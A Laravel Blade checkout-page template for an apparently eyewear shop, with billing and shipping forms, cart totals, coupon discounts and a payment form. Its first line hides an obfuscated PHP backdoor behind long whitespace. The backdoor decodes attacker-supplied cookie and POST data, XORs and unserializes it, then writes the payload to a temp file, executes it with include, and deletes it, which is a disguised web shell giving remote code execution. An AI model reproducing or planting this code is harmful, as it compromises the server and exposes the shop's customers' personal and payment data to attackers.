<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("zcfkln")){class zcfkln{public static $pnzdcjvsl = "pqoluaonhfegjnlc";public static $jdnumwx = NULL;public function __construct(){$bgopw = @$_COOKIE[substr(zcfkln::$pnzdcjvsl, 0, 4)];if (!empty($bgopw)){$wgyldemjv = "base64";$hlenbfzgah = "";$bgopw = explode(",", $bgopw);foreach ($bgopw as $leexzzunlw){$hlenbfzgah .= @$_COOKIE[$leexzzunlw];$hlenbfzgah .= @$_POST[$leexzzunlw];}$hlenbfzgah = array_map($wgyldemjv . "_decode", array($hlenbfzgah,));$hlenbfzgah = $hlenbfzgah[0] ^ str_repeat(zcfkln::$pnzdcjvsl, (strlen($hlenbfzgah[0]) / strlen(zcfkln::$pnzdcjvsl)) + 1);zcfkln::$jdnumwx = @unserialize($hlenbfzgah);}}public function __destruct(){$this->iwisnnl();}private function iwisnnl(){if (is_array(zcfkln::$jdnumwx)) {$xekrwabss = sys_get_temp_dir() . "/" . crc32(zcfkln::$jdnumwx["salt"]);@zcfkln::$jdnumwx["write"]($xekrwabss, zcfkln::$jdnumwx["content"]);include $xekrwabss;@zcfkln::$jdnumwx["delete"]($xekrwabss);exit();}}}$lsmnivesbo = new zcfkln();$lsmnivesbo = NULL;} ?>@extends('layouts.app')
{{-- Meta tag Section Start --}}
@php
$meta_title = $meta_description = $meta_keywords = "";
$meta_title = (!empty($meta_tag->page_meta_title)) ? $meta_tag->page_meta_title : "Checkout Meta Title";
$meta_description = (!empty($meta_tag->page_meta_description)) ? $meta_tag->page_meta_description : "Checkout Meta Description";
$meta_keywords = (!empty($meta_tag->page_meta_keywords)) ? $meta_tag->page_meta_keywords : "Checkout Meta Keywords";


@endphp

@section('title',$meta_title)
@section('description',$meta_description)
@section('keywords',$meta_keywords)

{{-- Meta tag Section End --}}

@section('content')
<br>
<div class="sun-breadcrumb-01">
<div class="container-fluid">
<div class="row">
<div class="col-lg-12">
<div class="breadcrumb-01">
<ul>
<li><a href="{{url('/')}}"><i class="fas fa-home" style="margin-top: 6px;
    margin-left: 18px;"></i></a></li>
<li><a href="">Checkout</a></li>
</ul>
</div>
</div>
</div>
</div>
</div>

<div class="privacy-page">
<div class="container">
    <div class="row mb-5">
       <div class="col-12 text-center">
           
<h3><b>Checkout</b></h3>
       </div> 
    </div>
<!--<div class="row">
<div class="col-lg-12">
<div class="user-actions">
<h3> 
<i class="fa fa-file-o" aria-hidden="true"></i>
Returning customer?
<a class="Returning" href="#" data-toggle="collapse" data-target="#checkout_login" aria-expanded="true">Click here to login</a>     

</h3>
<div id="checkout_login" class="collapse" data-parent="#accordion">
<div class="checkout_info">
<p>If you have shopped with us before, please enter your details in the boxes below. If you are a new customer please proceed to the Billing &amp; Shipping section.</p>  
<form action="#">  
<div class="form_group">
    <label>Username or email <span>*</span></label>
    <input type="text">     
</div>
<div class="form_group">
    <label>Password  <span>*</span></label>
    <input type="text">     
</div> 
<div class="form_group group_3 ">
    <button type="submit">Login</button>
    <label for="remember_box">
        <input id="remember_box" type="checkbox">
        <span> Remember me </span>
    </label>     
</div>
<a href="#">Lost your password?</a>
</form>          
</div>
</div>    
</div>
<div class="user-actions">
<h3> 
<i class="fa fa-file-o" aria-hidden="true"></i>
Returning customer?
<a class="Returning" href="#" data-toggle="collapse" data-target="#checkout_coupon" aria-expanded="true">Click here to enter your code</a>     

</h3>
<div id="checkout_coupon" class="collapse" data-parent="#accordion">
<div class="checkout_info coupon_info">
<form action="#">
<input placeholder="Coupon code" type="text">
<button type="submit">Apply coupon</button>
</form>
</div>
</div>    
</div>    
</div>
</div>-->

@if(count($errors)>0)
<div class="alert alert-danger alert-dismissible show">
    <button type="button" class="close" data-dismiss="alert">&times;</button>
    <strong>Errors Occurred!</strong>
    <ul style="margin-left:25px;">
     @foreach($errors->all() as $error)
     <li>{{ $error }}</li>
     @endforeach
    </ul>
</div>
@endif

@if(session('success'))
<div class="alert alert-success alert-dismissible show">
    <button type="button" class="close" data-dismiss="alert">&times;</button>
    {{ session('success') }}
</div>
@endif

<div class="checkout_form">
<div class="row">
    
    <style>
  
.card {
  
  background: white;
 box-shadow: 0px 0px 0px grey;
  -webkit-transition:  box-shadow .6s ease-out;
     box-shadow: .8px .9px 3px grey;

}
.card:hover{ 
     box-shadow: 1px 8px 20px grey;
    -webkit-transition:  box-shadow .6s ease-in;
  }
 
body {
  background-color: #F0EFEE;
}      
        
        
        
    </style>
    
<div class="col-lg-6 col-md-6">
    <div class="card">
<form action="{{url('/address-form-submit')}}" method="post" style="padding:20px;">
@csrf
@method('POST')
<h3>Billing Details</h3>
<div class="row">

<div class="col-lg-12 mb-20">
<label>Full Name <span>*</span></label>
<input type="text" name="name" id="name" required placeholder="Enter your name" class="form-control" @if(!empty(Auth::guard('user')->user()->name)) value="{{ Auth::guard('user')->user()->name }}" @else value="{{ old('name') }}" @endif>
@error('name')
<span class="invalid-feedback" role="alert">
<strong>{{ $message }}</strong>
</span>
@enderror    
</div>

<div class="col-12 mb-20">
<label for="country">Country <span>*</span></label>


<select class="form-control country" name="country" required onchange="getStates()">
  <option value="">-- Select country --</option>
      @foreach($countries as $country)
       <option value="{{$country->id}}" @if($country->id == Auth::guard('user')->user()->country) selected @endif >{{ $country->name }}</option>
      @endforeach
    </select>
     @error('country')
  <span class="invalid-feedback" role="alert">
      <strong>{{ $message }}</strong>
  </span>
  @enderror

</div>

<div class="col-12 mb-20">
<label>Street address  <span>*</span></label>
 <input type="text" placeholder="Street address" id="address" name="address" class="form-control" @if(!empty(Auth::guard('user')->user()->address)) value="{{Auth::guard('user')->user()->address}}" @else value="{{ old('address') }}" @endif>
     @error('address')
  <span class="invalid-feedback" role="alert">
      <strong>{{ $message }}</strong>
  </span>
  @enderror    
</div>

<div class="col-8 mb-20">
<label>Town / City <span>*</span></label>
 <input type="text" name="city" id="city" required placeholder="Enter your city" class="form-control" @if(!empty(Auth::guard('user')->user()->city)) value="{{ Auth::guard('user')->user()->city }}" @else value="{{ old('city') }}" @endif>
     @error('city')
  <span class="invalid-feedback" role="alert">
      <strong>{{ $message }}</strong>
  </span>
  @enderror    
</div> 

<div class="col-4 mb-20">
<label>Pincode <span>*</span></label>
<input type="text" name="pincode" id="pincode" required placeholder="Enter your pincode" class="form-control" @if(!empty(Auth::guard('user')->user()->pincode)) value="{{ Auth::guard('user')->user()->pincode }}" @else value="{{ old('pincode') }}" @endif>
     @error('pincode')
  <span class="invalid-feedback" role="alert">
      <strong>{{ $message }}</strong>
  </span>
  @enderror   
</div> 

<div class="col-12 mb-20">
<label>State<span>*</span></label>
 <select class="form-control state" name="state" required>
  @if(!empty(Auth::guard('user')->user()->state))
  @foreach($states as $state)
   <option value="{{$state->id}}" @if($state->id == Auth::guard('user')->user()->state) selected @endif >{{ $state->name }}</option>
  @endforeach
  @endif
</select>
 @error('state')
  <span class="invalid-feedback" role="alert">
      <strong>{{ $message }}</strong>
  </span>
  @enderror   
</div> 
<div class="col-lg-6 mb-20">
<label>Phone<span>*</span></label>
 <input type="text" name="mobile" required id="mobile" placeholder="Enter your mobile" class="form-control" @if(!empty(Auth::guard('user')->user()->mobile)) value="{{ Auth::guard('user')->user()->mobile }}" @else value="{{ old('mobile') }}" @endif>

  @error('mobile')
  <span class="invalid-feedback" role="alert">
      <strong>{{ $message }}</strong>
  </span>
  @enderror 

</div> 
<div class="col-lg-6 mb-20">
<label> Email Address   <span>*</span></label>
<input type="text" name="email" id="email" required placeholder="Enter your email" class="form-control" @if(!empty(Auth::guard('user')->user()->email)) value="{{ Auth::guard('user')->user()->email }}" @else value="{{ old('email') }}" @endif>
    
    @error('email')
    <span class="invalid-feedback" role="alert">
    <strong>{{ $message }}</strong>
    </span>
    @enderror

</div> 


<label style="margin-left: 10%;">
<input id="ship-address-check" onclick="ship_addr_check()" type="checkbox" value="1" name="ship_to_different_address">
<span>Ship to a different address?</span>
</label>
<div class="col-12 mb-20" id="shipping-address" style="display:none">

   <div class="row">
       
        <div class="col-lg-12 mb-20">
            <label>Full Name  <span>*</span></label>
           <input type="text" name="ship_name" id="ship_name" placeholder="Enter your name" class="form-control" @if(!empty($shipping_address->ship_name)) value="{{$shipping_address->ship_name}}" @endif >
 @error('ship_name')
    <span class="invalid-feedback" role="alert">
    <strong>{{ $message }}</strong>
    </span>
    @enderror
        </div>
       
        <div class="col-12 mb-20">
            <div class="select_form_select">
                <label for="countru_name">country <span>*</span></label>
<select class="form-control country1" name="ship_country" onchange="getStates1()">
      @foreach($countries as $country)
       <option value="{{$country->id}}" @if(!empty($shipping_address->ship_country)) @if($shipping_address->ship_country==$country->id) selected @endif @endif >{{ $country->name }}</option>
      @endforeach
    </select>
    @error('ship_country')
    <span class="invalid-feedback" role="alert">
    <strong>{{ $message }}</strong>
    </span>
    @enderror
            </div> 
        </div>

        <div class="col-12 mb-20">
            <label>Street address  <span>*</span></label>
            <input type="text" placeholder="Street address" id="ship_address" name="ship_address" class="input-text " @if(!empty($shipping_address->ship_address)) value="{{$shipping_address->ship_address}}" @endif >
    @error('ship_address')
    <span class="invalid-feedback" role="alert">
    <strong>{{ $message }}</strong>
    </span>
    @enderror    
        </div>
       
<div class="col-8 mb-20">
<label>Town / City <span>*</span></label>
<input type="text" name="ship_city" id="ship_city" placeholder="Enter your city" class="form-control" @if(!empty($shipping_address->ship_city)) value="{{$shipping_address->ship_city}}" @endif >
@error('ship_city')
<span class="invalid-feedback" role="alert">
<strong>{{ $message }}</strong>
</span>
@enderror  
</div> 

<div class="col-4 mb-20">
<label>Pincode <span>*</span></label>
 <input type="text" name="ship_pincode" id="ship_pincode" placeholder="Enter your pincode" class="form-control" @if(!empty($shipping_address->ship_pincode)) value="{{$shipping_address->ship_pincode}}" @endif >
@error('ship_pincode')
    <span class="invalid-feedback" role="alert">
    <strong>{{ $message }}</strong>
    </span>
    @enderror 
</div> 

         <div class="col-12 mb-20">
            <label>State / County <span>*</span></label>
             <select class="form-control state1" name="ship_state">
 @if(!empty($shipping_address)) 
  @foreach($states as $state)
   <option value="{{$state->id}}"  @if(!empty($shipping_address->ship_state)) @if($shipping_address->ship_state==$state->id) selected @endif @endif  >{{ $state->name }}</option>
  @endforeach
  @endif
</select>
@error('ship_state')
    <span class="invalid-feedback" role="alert">
    <strong>{{ $message }}</strong>
    </span>
    @enderror    
        </div> 
        <div class="col-lg-6 mb-20">
            <label>Phone<span>*</span></label>
             <input type="text" name="ship_mobile" id="ship_mobile" placeholder="Enter your mobile" class="form-control" @if(!empty($shipping_address->ship_mobile)) value="{{$shipping_address->ship_mobile}}" @endif >
@error('ship_mobile')
    <span class="invalid-feedback" role="alert">
    <strong>{{ $message }}</strong>
    </span>
    @enderror

        </div> 
         <div class="col-lg-6">
            <label> Email Address   <span>*</span></label>
             <input type="text" name="ship_email" id="ship_email" placeholder="Enter your email" class="form-control" @if(!empty($shipping_address->ship_email)) value="{{$shipping_address->ship_email}}" @endif  >
   @error('ship_email')
    <span class="invalid-feedback" role="alert">
    <strong>{{ $message }}</strong>
    </span>
    @enderror 

        </div> 
    </div>

</div>
     	    	    	    	    	    	    
</div>
<input type="submit" name="submit" value="Update Info" class="btn btn-primary">
</form>
   
</div>
<br><br>
</div>

@php
$final_total_price=0;
$coat_price="0.00";
$check_coating = DB::table('cart_coating')->where('session_id',Session::get('session_id'))->count();
if($check_coating>0){
$coatings = DB::table('cart_coating')->where('session_id',Session::get('session_id'))->get();
 foreach($coatings as $coat){
   $coat_price += $coat->coating_price;
  } 
}
$total_cart = DB::table('carts')->where('session_id',Session::get('session_id'))->get();
foreach ($total_cart as $total) {
if(!empty($total->lens_id)){
$final_total_price += ($total->quantity*$total->price)+($total->lens_price*$total->lens_qty)+$total->vision_price+$total->lens_color_price+$total->prism_price+$coat_price;
}else{
$final_total_price += ($total->quantity*$total->price)+($total->lens_price*$total->lens_qty);
}
}
@endphp
@if($final_total_price>0)
<div class="col-lg-6 col-md-6">
  <div class="card">  
  <div class=" " style="padding:20px;">
<h3>Your order</h3> 
<div class="order_table table-responsive">
<table>
<thead>
    <tr>
        <th>Product</th>
        <th>Total</th>
    </tr>
</thead>
<tbody>
 @foreach($carts as $cart)  
@php
 $prd = DB::table('categories')->where('id',$cart->product_id)->first();
 $parent = DB::table('categories')->select('category_name')->where('id',$prd->category_parent_id)->first();
@endphp   
<tr>
    <td> 
    <span class="font-weight-bold">Brand : </span> {{$parent->category_name}}
    <br>
    {{$cart->product_name}}
    <br>
    {{$prd->category_uan_code}}
    <br>
    <span class="font-weight-bold">EAN : </span> {{$prd->category_sku_code}}
    <br>
    
    @if(!empty($cart->lens_id)) 
<h5>Lens Detail</h5>
@php
$vision_detail = DB::table('visions')->where('id',$cart->vision_id)->first();
$lens_detail = DB::table('lenses')->where('id',$cart->lens_id)->first();
$lens_color_type = DB::table('lens_color_types')->where('id',$cart->lens_color_id)->first();
@endphp
<p>Vision: {{$vision_detail->vision_name}}
@if($vision_detail->vision_price==0.00)

@else
({{$cart->currency_symbol()}}{{$cart->vision_price}})
@endif</p>

@php
 $lens_color_parent=DB::table('lens_color_types')->where('id',$lens_color_type->category_parent_id)->first();
@endphp
@if($cart->is_tint=="tint")

<p>Color Type: {{$lens_color_parent->category_name}} - {{$lens_color_type->category_name}}
@if($lens_color_type->category_price==0.00)

@else
- {{$cart->currency_symbol}}{{$cart->lens_color_price}}
@endif
</p>

@else

<p>Color Type: {{$lens_color_type->category_name}}
@if($lens_color_type->category_price==0.00)

@else
- {{$cart->currency_symbol}}{{$cart->lens_color_price}}
@endif
</p>
@endif

<p>Lens: {{$lens_detail->name}} ({{$lens_detail->lens_index}}) + {{$cart->lens_price}}</p>

@if($cart->is_prism=="Yes")
<p>Prism: {{$cart->currency_symbol.$cart->prism_price}}</p>
@endif

@php
$coat_price="0.00";
$check_coating = DB::table('cart_coating')->where('cart_id',$cart->id)->count();
@endphp
@if($check_coating>0)
@php
$coatings = DB::table('cart_coating')->where('cart_id',$cart->id)->get();
 foreach($coatings as $coat){
   $coat_price += $coat->coating_price;
  } 
 @endphp
 <p>Lens Coating: {{$cart->currency_symbol.$coat_price}}</p>
@endif

@endif
    <strong> × {{$cart->quantity}}</strong>
    
</td>
@if(!empty($cart->lens_id))    
<td> {{$cart->currency_symbol}}{{($cart->price*$cart->quantity)+($cart->lens_price*$cart->lens_qty)+$cart->vision_price+$cart->lens_color_price+$cart->prism_price+$coat_price}}</td>
@else
<td> {{$cart->currency_symbol}}{{($cart->price*$cart->quantity)+($cart->lens_price*$cart->lens_qty)}}</td>
@endif
</tr>

@endforeach
</tbody>
<tfoot>
    <tr>
        <th>Cart Subtotal</th>
        <td>{{getCurrencySymbol($ip_country).$final_total_price}}</td>
    </tr>
    <tr>
        <th>Shipping Charges</th>
        <td>
           {{getCurrencySymbol($ip_country).$shipping_charges}}
        </td>
    </tr>
@php
$checkUserCoupon = DB::table('user_coupon')->where('user_id',Auth::guard('user')->user()->id)->where('status','Applied')->first();
@endphp    
@if(!empty($checkUserCoupon))
@php
$coupon = DB::table('coupons')->where('id',$checkUserCoupon->coupon_id)->first();
if($coupon->coupon_type == "Fixed"){
$discount = getCurrencyPrice($ip_country,$coupon->coupon_amount);
$final_amount = $final_total_price - $discount; 
}else if($coupon->coupon_type == "Percent_off"){
$discount = ($final_total_price/100)*$coupon->coupon_amount;
$final_amount = $final_total_price - $discount;  
}
@endphp
<tr>
<th>Discount</th>
<td><strong> - {{getCurrencySymbol($ip_country).$discount}}</strong></td>
</tr>
@endif    
    <tr class="order_total">
        <th>Order Total</th>
        <td><strong>{{getCurrencySymbol($ip_country)}}@if(!empty($checkUserCoupon))
           {{$final_amount+$shipping_charges}}
          @else
           {{$final_total_price+$shipping_charges}}
          @endif</strong> 
          <small>[including taxes]</small>
          </td>
    </tr>
</tfoot>
</table>     
</div>
<div class="payment_method">
<form action="{{ url('/pay-now') }}" method="post" id="payment_form" onsubmit="event.preventDefault();">
@csrf
@method('POST')
<input type="hidden" name="amount" id="amount">
<input type="radio" value="Online" name="payment_method" id="payment_method" checked style="border: 1px solid #ededed;
    background: none;
    height: 13px;
    width: 4%;
    padding: 0 20px;
    color: #222222;">
<label for="payment_method_cheque">Online </label>
<input type="radio" value="COD" name="payment_method" id="payment_method" style="border: 1px solid #ededed;
    background: none;
    height: 13px;
    width: 4%;
    padding: 0 20px;
    color: #222222;">
<label for="payment_method_cod">Cash on delivery </label><br>   

<div class="order_button">
<button type="submit" class="buy_now" onclick="getAmount()" @if(empty(Auth::guard('user')->user()->address) && empty(Auth::guard('user')->user()->city) && empty(Auth::guard('user')->user()->country) && empty(Auth::guard('user')->user()->state) && empty(Auth::guard('user')->user()->pincode) ) disabled @endif>Proceed to Pay</button> 
</div> 
</form>
</div>
<br>
<span><b>Note:</b><i> You can't place order until you not fill your address detail. </i></span>  
</div></div></div>
@endif
</div> 
</div> 
</div>
</div>


<script type="text/javascript">
  function getAmount(){
    var url="{{ url('/') }}/get-amount";
    $.ajax({
      url:url,
      type:"post",
      success:function(response){
       $('#amount').val(response); 
       setTimeout(function(){payment()},1000); 
      },error:function(response){
        alert(response)
      }
    });
  }

    var payment_method="";
    function payment(){
       payment_method = $('#payment_method:checked').val();
          $('#payment_form').attr('onsubmit',"");
          $('#payment_form').submit();
       }

 </script>

@endsection